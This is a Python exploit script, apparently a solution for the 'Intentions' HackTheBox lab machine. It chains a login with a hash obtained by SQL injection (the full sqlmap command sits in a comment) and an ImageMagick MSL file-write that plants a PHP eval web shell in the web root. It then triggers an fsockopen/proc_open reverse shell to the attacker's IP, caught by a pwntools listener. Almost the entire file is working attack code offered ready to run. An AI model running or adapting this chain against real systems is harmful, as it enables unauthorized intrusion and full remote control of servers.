#!/usr/bin/python3

import requests
import sys
import threading
import subprocess
from time import sleep
from pwn import *
from http.server import BaseHTTPRequestHandler, HTTPServer

class MyHttpHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        if self.path == '/a':
            self.send_response(200)
            result = subprocess.run(["convert", "xc:red", "-set", "'Copyright'", "'<?php @eval(@$_REQUEST[\"a\"]); ?>'", "PNG:-"], stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)
            self.send_header('Content-Length', len(result.stdout))
            self.end_headers()
            self.wfile.write(result.stdout)

            threading.Thread(target=trigger_reverse_shell).start()

def trigger_reverse_shell():
    payload = {"a":f"""$sock=fsockopen("{callback_ip}",{callback_port});$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);"""}
    response = session.post(f"http://{remote_ip}/a.php", data=payload)

def login_to_v2() -> str:
    # login to v2 with a hash we got from sqli in api/v1/gallery/user/genres + /api/v1/gallery/user/feed 
    # (sqlmap: sqlmap -r genres.req --output-dir=sql_dump --threads=2 --batch --risk=3 -dbs --tamper=space2comment --second-req get_feed_second_request.req)
    # This will return a token for an admin user (steve / greg)
    url = "http://intentions.htb:80/api/v2/auth/login"
    json={"email": "steve@intentions.htb", "hash": "$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa"}
    response = session.post(url, json=json)

    if response.status_code == 200:
        print(f"[+] Logged in as admin successfully")
        token = session.cookies.get("token")
        print(f"[+] Got a token: {token}")
        return token
    else:
        print(f"[!] User login failed: {response.text}")
        exit()

def exploit_imagick_to_get_shell():
    print("[+] Exploiting imagick")
    sleep(2)
    
    mslPayload = f"""<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="http://{callback_ip}/a" />
<write filename="/var/www/html/intentions/public/a.php" />
</image>"""

    url = "http://intentions.htb:80/api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=dark"
    cookies = {"token": token}
    headers = {"Content-Type": "multipart/form-data; boundary=------------------------ABC"}
    data = f"--------------------------ABC\r\nContent-Disposition: form-data; name=\"exec\"; filename=\"exec.msl\"\r\nContent-Type: application/octet-stream\r\n\r\n{mslPayload}\r\n--------------------------ABC--\r\n\r\n"
    response = session.post(url, headers=headers, cookies=cookies, data=data)
    
    if response.status_code == 200:
        print(f"[+] Download payload command successful")
    else:
        print(f"[!] Download payload command failed: {response.text}")
        exit()

def start_http_server():
    with HTTPServer(("", 80), MyHttpHandler) as server:
        server.serve_forever()

def init_http_server():
    print("[+] Starting http server")
    thread = threading.Thread(target=start_http_server)
    thread.start()

def initiate_call_back():
    print("[+] Starting reverse shell listener in 4..3..2..1")
    l = listen(int(callback_port))
    conn = l.wait_for_connection()
    conn.interactive()

def start_callback_server():
    t = threading.Thread(target=initiate_call_back)
    t.start()

if __name__ == "__main__":
    # parse args
    callback_port = 8002
    callback_ip = "10.10.14.21"
    remote_ip = "10.129.18.145"

    session = requests.Session()
    token = login_to_v2()
    init_http_server()
    start_callback_server()
    exploit_imagick_to_get_shell()